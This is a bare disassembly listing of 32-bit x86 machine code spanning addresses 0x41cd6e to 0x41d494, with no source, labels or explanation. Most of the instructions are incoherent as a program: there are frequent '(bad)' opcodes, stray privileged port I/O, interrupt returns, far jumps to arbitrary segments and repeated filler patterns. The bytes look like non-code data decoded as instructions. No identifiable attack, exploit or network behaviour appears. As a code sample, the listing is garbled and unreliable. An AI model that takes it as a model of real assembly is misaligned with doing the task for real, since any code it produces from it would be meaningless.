  41cd6e:	xchg   ebx,eax
  41cd6f:	lods   ax,WORD PTR ds:[esi]
  41cd71:	sbb    DWORD PTR [ebp+0x61f61c72],ecx
  41cd77:	and    ch,BYTE PTR [eax+0x7c]
  41cd7a:	add    BYTE PTR [eax],0x10
  41cd7d:	mov    edi,0x61f5b582
  41cd82:	sub    eax,0xbd4f5e4
  41cd87:	jae    0x41cd89
	...
  41cd91:	add    BYTE PTR [eax],al
  41cd93:	add    BYTE PTR [edx+0x34],dl
  41cd96:	inc    eax
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0xb46a4e09
  41cda1:	loop   0x41cdc0
  41cda3:	and    esi,DWORD PTR [edi-0x53fffe77]
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR [edi+0x3dafcaf0],dl
  41cdb1:	push   es
  41cdb2:	push   0x32
  41cdb4:	or     dl,al
  41cdb6:	and    ch,BYTE PTR [eax+0x5dd1dffa]
  41cdbc:	mov    edi,db3
  41cdbf:	add    bh,BYTE PTR [ecx-0x4410e039]
  41cdc5:	add    DWORD PTR [eax],ebx
  41cdc7:	sub    edi,DWORD PTR [ebx-0x43]
  41cdca:	push   es
  41cdcb:	cmp    eax,0x18c92e0a
  41cdd0:	test   al,0x7
  41cdd2:	mov    DWORD PTR [ebx+0x1c2236b8],esi
  41cdd8:	mov    WORD PTR [esi],ss
  41cdda:	mov    WORD PTR [esi-0x2200fbb6],?
  41cde0:	xchg   BYTE PTR [esp+eax*2+0x5eea364e],ah
  41cde7:	les    ebx,FWORD PTR [esi+0x5d]
  41cdea:	daa    
  41cdeb:	adc    BYTE PTR [esi-0x43],ah
  41cdee:	ds repz jns 0x41cdcc
  41cdf2:	push   eax
  41cdf3:	ror    BYTE PTR [eax-0x685ee34a],1
  41cdf9:	sar    DWORD PTR [ecx-0x58efb91c],cl
  41cdff:	scas   al,BYTE PTR es:[edi]
  41ce00:	pushaw 
  41ce02:	lea    esp,[ecx-0x555e35f3]
  41ce08:	dec    eax
  41ce09:	add    BYTE PTR [edi-0x526e099c],0xa5
  41ce10:	shr    BYTE PTR [ecx],1
  41ce12:	out    dx,eax
  41ce13:	iret   
  41ce14:	dec    ecx
  41ce15:	dec    esp
  41ce16:	idiv   edi
  41ce18:	add    eax,0x2b167738
  41ce1d:	jp     0x41cdec
  41ce1f:	pop    es
  41ce20:	out    0x4e,eax
  41ce22:	or     bh,BYTE PTR [edi]
  41ce24:	mov    bh,0x21
  41ce26:	sbb    BYTE PTR [ebp-0x7c],bl
  41ce29:	sbb    eax,0xe1d7fc0d
  41ce2e:	pop    ecx
  41ce2f:	mov    edx,0xf06cf6c6
  41ce34:	pop    esi
  41ce35:	inc    ecx
  41ce36:	ins    DWORD PTR es:[edi],dx
  41ce37:	xlat   BYTE PTR ds:[ebx]
  41ce38:	pop    es
  41ce39:	cmp    al,ch
  41ce3b:	stos   BYTE PTR es:[edi],al
  41ce3c:	sub    DWORD PTR [ebp-0x74],ebx
  41ce3f:	jle    0x41cde8
  41ce41:	dec    esi
  41ce42:	(bad)  
  41ce44:	into   
  41ce45:	inc    ebx
  41ce46:	outs   dx,DWORD PTR ds:[esi]
  41ce47:	sbb    DWORD PTR [esi+0x7b026926],0xf01525b8
  41ce51:	addr16 out dx,eax
  41ce53:	shl    DWORD PTR [ebx+ecx*8+0xe],1
  41ce57:	inc    BYTE PTR [eax]
	...
  41ce61:	add    BYTE PTR [eax],al
  41ce63:	add    BYTE PTR [ecx+0x46],cl
  41ce66:	sub    BYTE PTR [eax],dh
  41ce68:	das    
  41ce69:	jle    0x41cec4
  41ce6b:	jg     0x41ce33
  41ce6d:	imul   esi,eax,0xffffffd5
  41ce70:	arpl   WORD PTR [edx-0x54b0d3ff],sp
  41ce76:	add    DWORD PTR [eax],eax
  41ce78:	lods   al,BYTE PTR ds:[esi]
  41ce79:	add    BYTE PTR [eax],al
  41ce7b:	add    dl,bh
  41ce7d:	pop    ebx
  41ce7e:	or     DWORD PTR [eax-0x67403d97],0x1c
  41ce85:	scas   eax,DWORD PTR es:[edi]
  41ce86:	nop
  41ce87:	pop    eax
  41ce88:	pop    eax
  41ce89:	add    BYTE PTR [ebp-0x7b],ch
  41ce8c:	xlat   BYTE PTR ds:[ebx]
  41ce8d:	and    BYTE PTR [eax],bl
  41ce8f:	xchg   esp,eax
  41ce90:	mov    ch,0x66
  41ce92:	in     eax,dx
  41ce93:	sub    eax,0x2a129ff
  41ce98:	mov    eax,ds:0xaf13a6df
  41ce9d:	add    BYTE PTR [esi-0x6c647586],bl
  41cea3:	sub    DWORD PTR [esi],esi
  41cea5:	sub    ecx,DWORD PTR [esp+esi*8+0x5c]
  41cea9:	loopne 0x41cea7
  41ceab:	push   0x5b110571
  41ceb0:	sbb    DWORD PTR [edi+0x75c0b52],0xeadb3dc7
  41ceba:	(bad)  
  41cebb:	push   ds
  41cebc:	xchg   edx,eax
  41cebd:	setne  BYTE PTR [ecx+0x56f63d3d]
  41cec4:	call   0xf9e4:0xec38cc82
  41cecb:	fld    QWORD PTR [edx-0x28]
  41cece:	jle    0x41ce96
  41ced0:	out    dx,al
  41ced1:	xchg   edi,esi
  41ced3:	push   DWORD PTR ds:0xa1222186
  41ced9:	inc    ebp
  41ceda:	repz (bad) 
  41cedd:	xchg   DWORD PTR [eax-0x61],ecx
  41cee0:	fwait
  41cee1:	or     BYTE PTR [esi+0x6a1a601c],cl
  41cee7:	and    cl,al
  41cee9:	and    DWORD PTR [esi-0x70],eax
  41ceec:	inc    edi
  41ceed:	adc    BYTE PTR [eiz*2-0x4db1cdb7],ch
  41cef4:	fsub   QWORD PTR [ebx]
  41cef6:	lock lock add esp,DWORD PTR [edi-0x1c]
  41cefb:	push   es
  41cefc:	mov    bl,0x74
  41cefe:	xor    al,0xd2
  41cf00:	add    esp,esp
  41cf02:	inc    edi
  41cf03:	jb     0x41cec8
  41cf05:	sbb    ch,BYTE PTR [esi]
  41cf07:	mov    dl,0xe7
  41cf09:	(bad)  
  41cf0a:	jmp    0xfce3ad94
  41cf0f:	call   ebx
  41cf11:	dec    edi
  41cf12:	dec    esp
  41cf13:	ja     0x41cf20
  41cf15:	out    dx,al
  41cf16:	fisub  DWORD PTR [esi]
  41cf18:	or     al,0x25
  41cf1a:	pop    ecx
  41cf1b:	fisttp QWORD PTR [ebx+0x4f6a9c24]
  41cf21:	cli    
  41cf22:	inc    esi
  41cf23:	sub    al,0xa1
  41cf25:	jl     0x41cecd
  41cf27:	sub    eax,DWORD PTR [eax]
	...
  41cf31:	add    BYTE PTR [eax],al
  41cf33:	add    BYTE PTR [edi-0x3a],ah
  41cf36:	and    dh,dh
  41cf38:	mov    eax,ds:0xe7d7f7f6
  41cf3d:	mov    eax,0x9401da72
  41cf42:	sub    BYTE PTR [ecx],ah
  41cf44:	sti    
  41cf45:	stos   DWORD PTR es:[edi],eax
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	lods   al,BYTE PTR ds:[esi]
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [eax-0x4],bl
  41cf4e:	adc    ebp,DWORD PTR [ebx+0x29]
  41cf51:	js     0x41cf5c
  41cf53:	test   al,0xcb
  41cf55:	das    
  41cf56:	aaa    
  41cf57:	ret    0x1f90
  41cf5a:	dec    esi
  41cf5b:	inc    esi
  41cf5c:	inc    esi
  41cf5d:	jo     0x41cfd4
  41cf5f:	mov    BYTE PTR [edx+0x79],dl
  41cf62:	test   BYTE PTR [edx],dh
  41cf64:	cmp    eax,0xdfe6f678
  41cf69:	or     dl,BYTE PTR [ecx]
  41cf6b:	pusha  
  41cf6c:	xchg   esi,eax
  41cf6d:	inc    esi
  41cf6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf6f:	out    dx,eax
  41cf70:	scas   al,BYTE PTR es:[edi]
  41cf71:	push   0x63
  41cf73:	mov    dh,0xe2
  41cf75:	add    eax,0x79206240
  41cf7a:	mov    ds:0x64ad9be8,al
  41cf7f:	pop    ebx
  41cf80:	sbb    BYTE PTR [ebx-0x7a3ad462],bl
  41cf86:	and    al,0xb7
  41cf88:	dec    ebp
  41cf89:	push   ecx
  41cf8a:	sbb    eax,0x78fb3d3c
  41cf8f:	xor    BYTE PTR [esi-0x73],0x4d
  41cf93:	cmp    esi,ebx
  41cf95:	loopne 0x41cffe
  41cf97:	push   0xd
  41cf99:	pop    ss
  41cf9a:	(bad)  
  41cf9b:	add    ch,ah
  41cf9d:	out    0x1,eax
  41cf9f:	enter  0xe6ee,0x7f
  41cfa3:	mov    ebp,0x4a89f510
  41cfa8:	ja     0x41cffd
  41cfaa:	push   esp
  41cfab:	idiv   eax
  41cfad:	inc    edx
  41cfae:	cld    
  41cfaf:	mov    dl,0x9
  41cfb1:	cmp    eax,0xb26fb6db
  41cfb6:	push   ss
  41cfb7:	pop    esp
  41cfb8:	jmp    DWORD PTR [ebp-0x2da48345]
  41cfbe:	iret   
  41cfbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfc0:	cs pop ss
  41cfc2:	mov    ah,0x27
  41cfc4:	mov    gs,WORD PTR [ebx]
  41cfc6:	inc    edx
  41cfc7:	mov    ecx,0x2acc5b4c
  41cfcc:	dec    esi
  41cfcd:	js     0x41cfda
  41cfcf:	imul   ebx,DWORD PTR [esi+0x57],0x41
  41cfd3:	sub    edi,DWORD PTR [ebx]
  41cfd5:	cmp    BYTE PTR [edx+edi*4+0x5c],bh
  41cfd9:	mov    bh,0x73
  41cfdb:	and    edi,edi
  41cfdd:	mov    ds:0x3c0ad96a,al
  41cfe2:	sub    BYTE PTR [esi],bh
  41cfe4:	push   eax
  41cfe5:	xor    bl,BYTE PTR [ecx+0x79]
  41cfe8:	jns    0x41cfbb
  41cfea:	cmp    eax,DWORD PTR [esi+ebx*1+0x61]
  41cfee:	test   DWORD PTR [ecx-0x770d5b6d],0xc8b2c336
	...
  41d004:	ret    
  41d005:	or     eax,0xefee66a6
  41d00a:	ret    
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	sub    al,0xb8
  41d00e:	mov    ds:0x4b391647,eax
  41d013:	jmp    0xac:0x1aca7
  41d01a:	add    BYTE PTR [eax],al
  41d01c:	sub    bl,BYTE PTR [edi-0x31]
  41d01f:	push   cs
  41d020:	mov    cl,0x56
  41d022:	mov    ch,dl
  41d024:	mov    WORD PTR [edx+ebx*2+0x3],cs
  41d028:	jl     0x41d020
  41d02a:	push   ebp
  41d02b:	inc    eax
  41d02c:	mov    bl,0x80
  41d02e:	stc    
  41d02f:	mov    ebx,es
  41d031:	sbb    eax,0xb61737f5
  41d036:	mov    eax,ds:0xbe3da2ef
  41d03b:	and    eax,esi
  41d03d:	push   cs
  41d03e:	lock xor al,0xef
  41d041:	aam    0x2
  41d043:	cmc    
  41d044:	cdq    
  41d045:	mov    edi,0x7d28f58f
  41d04a:	loop   0x41d078
  41d04c:	js     0x41d064
  41d04e:	lea    ebx,[esi+0xfc3567d]
  41d054:	push   esp
  41d055:	jmp    0x41d0cf
  41d057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d058:	lock in eax,0xc4
  41d05b:	test   DWORD PTR [edx],0x6f0deb1e
  41d061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d062:	and    BYTE PTR [esi+0x128f644f],ah
  41d068:	ds push esi
  41d06a:	push   eax
  41d06b:	mov    gs,WORD PTR [ecx]
  41d06d:	rol    DWORD PTR [ebp-0x3eeedba8],1
  41d073:	push   ss
  41d074:	call   0xa2f7e86d
  41d079:	fsubr  st,st(2)
  41d07b:	fmulp  st(3),st
  41d07d:	popa   
  41d07e:	xlat   BYTE PTR ds:[ebx]
  41d07f:	adc    dh,BYTE PTR [edx+0x3c]
  41d082:	jp     0x41d099
  41d084:	xchg   esp,eax
  41d085:	dec    edi
  41d086:	mov    dl,0xcc
  41d088:	jae    0x41d024
  41d08a:	aad    0x35
  41d08c:	sub    DWORD PTR [ebx+eax*4+0x56],ebp
  41d090:	ja     0x41d0eb
  41d092:	into   
  41d093:	mov    dh,0x4
  41d095:	push   esp
  41d096:	fist   DWORD PTR [eax+0x2b479bd]
  41d09c:	sar    ebp,cl
  41d09e:	mov    ebx,ebp
  41d0a0:	outs   dx,DWORD PTR ds:[esi]
  41d0a1:	out    dx,eax
  41d0a2:	daa    
  41d0a3:	mov    ch,BYTE PTR [ebp-0x65ccde17]
  41d0a9:	mov    cl,0x4f
  41d0ab:	or     BYTE PTR [ebp+0x0],dh
  41d0ae:	std    
  41d0af:	mov    esp,0x828d4d3d
  41d0b4:	mov    ah,0x11
  41d0b6:	and    ch,BYTE PTR [esi-0x314f1f12]
  41d0bc:	sub    al,0x71
  41d0be:	test   al,0x7a
  41d0c0:	jne    0x41d090
  41d0c2:	div    DWORD PTR [esi-0x27]
  41d0c5:	les    ebp,FWORD PTR [eax+0x35]
	...
  41d0d4:	fld    st(2)
  41d0d6:	add    eax,0xddcf1f49
  41d0db:	ror    al,cl
  41d0dd:	outs   dx,DWORD PTR ds:[esi]
  41d0de:	clc    
  41d0df:	shl    BYTE PTR [esi+0x533f2dcd],cl
  41d0e5:	lods   eax,DWORD PTR ds:[esi]
  41d0e6:	add    DWORD PTR [eax],eax
  41d0e8:	lods   al,BYTE PTR ds:[esi]
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [esi-0x16b56721],bh
  41d0f1:	push   cs
  41d0f2:	sti    
  41d0f3:	adc    eax,0x8a401dff
  41d0f8:	pop    eax
  41d0f9:	outs   dx,DWORD PTR ds:[esi]
  41d0fa:	jne    0x41d148
  41d0fc:	lea    edx,[eax+0x31]
  41d0ff:	xchg   ecx,eax
  41d100:	sub    BYTE PTR [esp+ebp*1],bh
  41d103:	jmp    0x92d1e254
  41d108:	jge    0x41d0a6
  41d10a:	ja     0x41d0b1
  41d10c:	jmp    0x41d178
  41d10e:	jae    0x41d0f9
  41d110:	jns    0x41d0d0
  41d112:	and    DWORD PTR [ecx+eax*4-0x64],ebx
  41d116:	mov    bl,0x5b
  41d118:	jne    0x41d10a
  41d11a:	pop    ebp
  41d11b:	inc    ecx
  41d11c:	int    0xb2
  41d11e:	adc    eax,0xfd49aeb
  41d123:	jne    0x41d13f
  41d125:	int3   
  41d126:	daa    
  41d127:	pop    edx
  41d128:	jb     0x41d104
  41d12a:	imul   esi,edi,0xffffffd7
  41d12d:	das    
  41d12e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d12f:	xor    eax,0xf2e5ce61
  41d134:	lods   al,BYTE PTR ds:[esi]
  41d135:	or     BYTE PTR [eax-0x195023e],0xf7
  41d13c:	jge    0x41d192
  41d13e:	stc    
  41d13f:	fwait
  41d140:	mov    WORD PTR [eax+esi*2+0x5533f381],ds
  41d147:	icebp  
  41d148:	mov    ds:0x1cc2dd2a,eax
  41d14d:	xor    dl,BYTE PTR [edx]
  41d14f:	mov    ds:0xa797f49f,eax
  41d154:	(bad)  ds:0xe0457b40
  41d15a:	into   
  41d15b:	jmp    0x4d9c:0xb79325
  41d162:	lds    esp,FWORD PTR [esi+0x4]
  41d165:	popa   
  41d166:	sbb    bh,BYTE PTR [ecx+0x47]
  41d169:	push   ecx
  41d16a:	sub    al,0xfb
  41d16c:	mov    dh,0xe3
  41d16e:	shl    DWORD PTR [ebp+0x7f],1
  41d171:	stos   BYTE PTR es:[edi],al
  41d172:	clc    
  41d173:	cmc    
  41d174:	lods   eax,DWORD PTR ds:[esi]
  41d175:	enter  0xc22b,0x26
  41d179:	aaa    
  41d17a:	aam    0xa9
  41d17c:	in     al,0xc4
  41d17e:	loope  0x41d172
  41d180:	out    0x3f,al
  41d182:	scas   al,BYTE PTR es:[edi]
  41d183:	jle    0x41d19e
  41d185:	and    eax,0x7a03ffee
  41d18a:	into   
  41d18b:	adc    ebx,edi
  41d18d:	stos   DWORD PTR es:[edi],eax
  41d18e:	sub    bh,BYTE PTR [edi+0x59]
  41d191:	xchg   esi,eax
  41d192:	mov    dl,0xd0
  41d194:	loopne 0x41d123
  41d196:	aad    0x8f
	...
  41d1a4:	popa   
  41d1a5:	pop    edi
  41d1a6:	lock (bad) 
  41d1a8:	(bad)  
  41d1a9:	out    dx,eax
  41d1aa:	repz pop edi
  41d1ac:	mov    dl,0xc5
  41d1ae:	ret    
  41d1af:	in     eax,dx
  41d1b0:	jmp    0x1ad:0xffef653e
  41d1b7:	add    BYTE PTR [eax],bl
  41d1b9:	add    BYTE PTR [eax],al
  41d1bb:	add    BYTE PTR [edx+0xb],ch
  41d1be:	lea    eax,[ecx+0x2051e57e]
  41d1c4:	sbb    esp,edx
  41d1c6:	lods   eax,DWORD PTR ds:[esi]
  41d1c7:	xchg   esi,eax
  41d1c8:	mov    WORD PTR [ebx+ecx*1],es
  41d1cb:	test   eax,0xeae1c736
  41d1d0:	sbb    eax,0xf1c99f
  41d1d5:	pusha  
  41d1d6:	inc    edx
  41d1d7:	add    BYTE PTR [eax+eiz*2],al
  41d1da:	inc    edx
  41d1db:	add    BYTE PTR [eax],cl
  41d1dd:	pusha  
  41d1de:	inc    edx
  41d1df:	add    BYTE PTR [eax+eiz*2],cl
  41d1e2:	inc    edx
  41d1e3:	add    BYTE PTR [eax],dl
  41d1e5:	pusha  
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [eax+eiz*2],dl
  41d1ea:	inc    edx
  41d1eb:	add    BYTE PTR [eax],bl
  41d1ed:	pusha  
  41d1ee:	inc    edx
  41d1ef:	add    BYTE PTR [eax+eiz*2],bl
  41d1f2:	inc    edx
  41d1f3:	add    BYTE PTR [eax],al
  41d1f5:	jo     0x41d239
  41d1f7:	add    BYTE PTR [eax+esi*2],al
  41d1fa:	inc    edx
  41d1fb:	add    BYTE PTR [eax],cl
  41d1fd:	jo     0x41d241
  41d1ff:	add    BYTE PTR [eax+esi*2],cl
  41d202:	inc    edx
  41d203:	add    BYTE PTR [eax],dl
  41d205:	jo     0x41d249
  41d207:	add    BYTE PTR [eax+esi*2],dl
  41d20a:	inc    edx
  41d20b:	add    BYTE PTR [eax],bl
  41d20d:	jo     0x41d251
  41d20f:	add    BYTE PTR [eax+esi*2],bl
  41d212:	inc    edx
  41d213:	add    BYTE PTR [eax],al
  41d215:	add    BYTE PTR [edx+0x0],0x4
  41d219:	add    BYTE PTR [edx+0x0],0x8
  41d21d:	add    BYTE PTR [edx+0x0],0xc
  41d221:	add    BYTE PTR [edx+0x0],0x10
  41d225:	add    BYTE PTR [edx+0x0],0x14
  41d229:	add    BYTE PTR [edx+0x0],0x18
  41d22d:	add    BYTE PTR [edx+0x0],0x1c
  41d231:	add    BYTE PTR [edx+0x0],0x78
  41d235:	data16 ins BYTE PTR es:[edi],dx
  41d237:	jp     0x41d290
  41d239:	jbe    0x41d282
  41d23b:	ja     0x41d280
  41d23d:	js     0x41d287
  41d23f:	jno    0x41d291
  41d241:	arpl   WORD PTR [ebx+0x6f],dx
  41d244:	inc    edi
  41d245:	dec    esi
  41d246:	outs   dx,DWORD PTR ds:[esi]
  41d247:	pop    ecx
  41d248:	inc    edi
  41d249:	jb     0x41d292
  41d24b:	jns    0x41d2c3
  41d24d:	inc    ecx
  41d24e:	pop    eax
  41d24f:	dec    esp
  41d250:	add    BYTE PTR [eax],al
  41d252:	add    BYTE PTR [eax],al
  41d254:	(bad)  
  41d256:	inc    ecx
  41d257:	add    ah,ah
  41d259:	aad    0x41
  41d25b:	add    BYTE PTR [esp+edx*8+0xbef0041],bl
  41d262:	mov    dl,0xe
  41d264:	jns    0x41d2b4
  41d266:	xor    BYTE PTR [esi-0x79],cl
  41d269:	dec    edi
  41d26a:	cmp    eax,0x3e4faf4e
  41d26f:	dec    esi
  41d270:	js     0x41d2c0
  41d272:	cmp    ecx,DWORD PTR [esi-0x64]
  41d275:	dec    edi
  41d276:	inc    esp
  41d277:	dec    esi
  41d278:	jae    0x41d2c8
  41d27a:	inc    ecx
  41d27b:	dec    esi
  41d27c:	xor    BYTE PTR [esi+0x40],cl
  41d27f:	dec    esi
  41d280:	pop    esp
  41d281:	pop    ebp
  41d282:	pop    edi
  41d283:	push   edx
  41d284:	cmp    DWORD PTR [esi+0x79],ecx
  41d287:	dec    esi
  41d288:	xor    BYTE PTR [esi-0x79],cl
  41d28b:	dec    edi
  41d28c:	cmp    eax,0x3e4faf4e
  41d291:	dec    esi
  41d292:	js     0x41d2e2
  41d294:	cmp    ecx,DWORD PTR [esi-0x64]
  41d297:	dec    edi
  41d298:	inc    esp
  41d299:	dec    esi
  41d29a:	mov    DWORD PTR [edi+0x41],ecx
  41d29d:	dec    esi
  41d29e:	xor    BYTE PTR [esi+0x40],cl
  41d2a1:	dec    esi
  41d2a2:	pop    esp
  41d2a3:	ins    DWORD PTR es:[edi],dx
  41d2a4:	pop    edi
  41d2a5:	bound  edi,QWORD PTR [ecx]
  41d2a7:	dec    esi
  41d2a8:	jns    0x41d2f8
  41d2aa:	xor    BYTE PTR [esi-0x80],cl
  41d2ad:	dec    edi
  41d2ae:	cmp    eax,0x394e734e
  41d2b3:	dec    esi
  41d2b4:	mov    ds:0x304e3a4f,al
  41d2b9:	dec    esi
  41d2ba:	inc    esi
  41d2bb:	dec    esi
  41d2bc:	pop    esp
  41d2bd:	jge    0x41d31e
  41d2bf:	jb     0x41d330
  41d2c1:	sub    BYTE PTR [esi-0x7d],0x7e
  41d2c5:	xchg   ebx,eax
  41d2c6:	jns    0x41d258
  41d2c8:	aas    
  41d2c9:	dec    esi
  41d2ca:	test   BYTE PTR [edi+0x30],cl
  41d2cd:	dec    esi
  41d2ce:	test   BYTE PTR [edi+0x3c],cl
  41d2d1:	dec    esi
  41d2d2:	mov    ds:0x734e394f,al
  41d2d7:	dec    esi
  41d2d8:	inc    ebp
  41d2d9:	dec    esi
  41d2da:	xor    BYTE PTR [esi+0x44],cl
  41d2dd:	dec    esi
  41d2de:	pop    esp
  41d2df:	lea    ebx,[edi-0x7e]
  41d2e2:	outs   dx,DWORD PTR ds:[esi]
  41d2e3:	xchg   edx,eax
  41d2e4:	outs   dx,BYTE PTR ds:[esi]
  41d2e5:	xchg   ebx,eax
  41d2e6:	jle    0x41d28b
  41d2e8:	jns    0x41d28a
  41d2ea:	aas    
  41d2eb:	dec    esi
  41d2ec:	test   BYTE PTR [edi+0x30],cl
  41d2ef:	dec    esi
  41d2f0:	test   BYTE PTR [edi+0x3c],cl
  41d2f3:	dec    esi
  41d2f4:	mov    ds:0x894e394f,al
  41d2f9:	dec    edi
  41d2fa:	inc    ebp
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x44],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	popf   
  41d302:	pop    edi
  41d303:	xchg   edx,eax
  41d304:	outs   dx,DWORD PTR ds:[esi]
  41d305:	mov    ds:0xb37ea36e,al
  41d30a:	jns    0x41d2bc
  41d30c:	aas    
  41d30d:	dec    esi
  41d30e:	mov    cs,WORD PTR [edi+0x30]
  41d311:	dec    esi
  41d312:	lods   al,BYTE PTR ds:[esi]
  41d313:	dec    edi
  41d314:	cmp    eax,0x394e734e
  41d319:	dec    esi
  41d31a:	mov    eax,ds:0x304e3a4f
  41d31f:	dec    esi
  41d320:	inc    esp
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	lods   eax,DWORD PTR ds:[esi]
  41d324:	pop    edi
  41d325:	mov    ds:0xb36eb26f,al
  41d32a:	jle    0x41d2ef
  41d32c:	jns    0x41d2ee
  41d32e:	aas    
  41d32f:	dec    esi
  41d330:	mov    cs,WORD PTR [edi+0x30]
  41d333:	dec    esi
  41d334:	lods   al,BYTE PTR ds:[esi]
  41d335:	dec    edi
  41d336:	cmp    eax,0x394e7e4e
  41d33b:	dec    esi
  41d33c:	lahf   
  41d33d:	dec    edi
  41d33e:	cmp    ecx,DWORD PTR [esi+0x30]
  41d341:	dec    esi
  41d342:	inc    ebp
  41d343:	dec    esi
  41d344:	pop    esp
  41d345:	mov    ebp,0xc26fb25f
  41d34a:	outs   dx,BYTE PTR ds:[esi]
  41d34b:	ret    
  41d34c:	jle    0x41d321
  41d34e:	jns    0x41d320
  41d350:	aas    
  41d351:	dec    esi
  41d352:	mov    cs,WORD PTR [edi+0x30]
  41d355:	dec    esi
  41d356:	lods   al,BYTE PTR ds:[esi]
  41d357:	dec    edi
  41d358:	cmp    eax,0x394f804e
  41d35d:	dec    esi
  41d35e:	lods   al,BYTE PTR ds:[esi]
  41d35f:	dec    edi
  41d360:	cmp    cl,BYTE PTR [esi+0x30]
  41d363:	dec    esi
  41d364:	inc    esi
  41d365:	dec    esi
  41d366:	pop    esp
  41d367:	int    0x5f
  41d369:	ret    0xd26f
  41d36c:	outs   dx,BYTE PTR ds:[esi]
  41d36d:	sar    DWORD PTR [esi-0x1d],cl
  41d370:	jns    0x41d352
  41d372:	aas    
  41d373:	dec    esi
  41d374:	mov    cs,WORD PTR [edi+0x30]
  41d377:	dec    esi
  41d378:	lods   al,BYTE PTR ds:[esi]
  41d379:	dec    edi
  41d37a:	cmp    eax,0x394f834e
  41d37f:	dec    esi
  41d380:	mov    ds:0x304e3a4f,al
  41d385:	dec    esi
  41d386:	inc    esp
  41d387:	dec    esi
  41d388:	pop    esp
  41d389:	fstp   QWORD PTR [edi-0x2e]
  41d38c:	outs   dx,DWORD PTR ds:[esi]
  41d38d:	loop   0x41d3fd
  41d38f:	jecxz  0x41d40f
  41d391:	repz jns 0x41d384
  41d394:	aas    
  41d395:	dec    esi
  41d396:	lea    ecx,[edi+0x30]
  41d399:	dec    esi
  41d39a:	lahf   
  41d39b:	dec    edi
  41d39c:	cmp    eax,0x3c4fa04e
  41d3a1:	dec    esi
  41d3a2:	xor    BYTE PTR [esi+0x3f],cl
  41d3a5:	dec    esi
  41d3a6:	pop    esp
  41d3a7:	in     eax,dx
  41d3a8:	pop    edi
  41d3a9:	loop   0x41d41a
  41d3ab:	repnz outs dx,BYTE PTR ds:[esi]
  41d3ad:	repz jle 0x41d3b3
  41d3b0:	jns    0x41d3b2
  41d3b2:	jle    0x41d3c7
  41d3b4:	jns    0x41d3c6
  41d3b6:	cmp    al,0x4e
  41d3b8:	jg     0x41d408
  41d3ba:	xor    BYTE PTR [esi-0x65],cl
  41d3bd:	dec    edi
  41d3be:	xor    cl,BYTE PTR [esi-0x80]
  41d3c1:	dec    edi
  41d3c2:	cmp    al,0x4e
  41d3c4:	lods   eax,DWORD PTR ds:[esi]
  41d3c5:	dec    edi
  41d3c6:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c9:	dec    esi
  41d3ca:	inc    ebp
  41d3cb:	dec    esi
  41d3cc:	pop    esp
  41d3cd:	or     eax,0x126f025f
  41d3d2:	outs   dx,BYTE PTR ds:[esi]
  41d3d3:	adc    edi,DWORD PTR [esi+0x23]
  41d3d6:	jns    0x41d3f8
  41d3d8:	aas    
  41d3d9:	dec    esi
  41d3da:	add    BYTE PTR [eax],al
  41d3dc:	rol    BYTE PTR fs:[ecx+0x0],cl
  41d3e0:	pop    eax
  41d3e1:	aam    0x41
  41d3e3:	add    BYTE PTR [eax-0x2c],ah
  41d3e6:	inc    ecx
  41d3e7:	add    al,ch
  41d3e9:	aad    0x41
  41d3eb:	add    BYTE PTR [ebp+edx*8+0x41],dl
  41d3ef:	add    al,bl
  41d3f1:	aad    0x41
  41d3f3:	add    BYTE PTR [eax-0x2c],al
  41d3f6:	inc    ecx
  41d3f7:	add    BYTE PTR [esp+edx*8+0x41],al
  41d3fb:	add    ah,dl
  41d3fd:	aad    0x41
  41d3ff:	add    BYTE PTR [eax+0xd0041d4],ch
  41d405:	test   eax,0xba36f89c
  41d40a:	pushf  
  41d40b:	clc    
  41d40c:	pop    esp
  41d40d:	aam    0x41
  41d40f:	add    BYTE PTR [edx*8-0x2adfffbf],cl
  41d416:	inc    ecx
  41d417:	add    BYTE PTR [edx*8-0x2ac3ffbf],ch
  41d41e:	inc    ecx
  41d41f:	add    BYTE PTR [esp+edx*8-0x2d9fffbf],dl
  41d426:	inc    ecx
  41d427:	add    BYTE PTR [esp+edx*8-0x2b5bffbf],dh
  41d42e:	inc    ecx
  41d42f:	add    ah,ch
  41d431:	aad    0x41
  41d433:	add    BYTE PTR [esi+0x19f89c85],dh
  41d439:	or     edx,DWORD PTR [edi]
  41d43b:	sub    DWORD PTR [eax-0x2c],0x1c140041
  41d442:	push   ss
  41d443:	or     DWORD PTR [eax],0x7050d
  41d449:	add    BYTE PTR [eax+0x0],al
  41d44c:	cmp    al,BYTE PTR [edx+0x3e]
  41d44f:	ds retf 0x4247
  41d453:	add    BYTE PTR [ebp+0x55],ch
  41d456:	inc    esp
  41d457:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d45d:	in     eax,dx
  41d45e:	inc    BYTE PTR [edi]
  41d460:	aas    
  41d461:	cli    
  41d462:	mov    ds:0x41d45005,eax
  41d467:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d46d:	xchg   esi,eax
  41d46e:	pushf  
  41d46f:	clc    
  41d470:	mov    ah,0x95
  41d472:	pushf  
  41d473:	clc    
  41d474:	mov    ebx,0xbaf89c95
  41d479:	xchg   ebp,eax
  41d47a:	pushf  
  41d47b:	clc    
  41d47c:	mov    ecx,0xb8f89c95
  41d481:	xchg   ebp,eax
  41d482:	pushf  
  41d483:	clc    
  41d484:	mov    edi,0xbef89c95
  41d489:	xchg   ebp,eax
  41d48a:	pushf  
  41d48b:	clc    
  41d48c:	mov    ebp,0xa6f89c95
  41d491:	xchg   ebp,eax
  41d492:	pushf  
  41d493:	clc    
  41d494:	jmp    0x41d2:0x586003f9
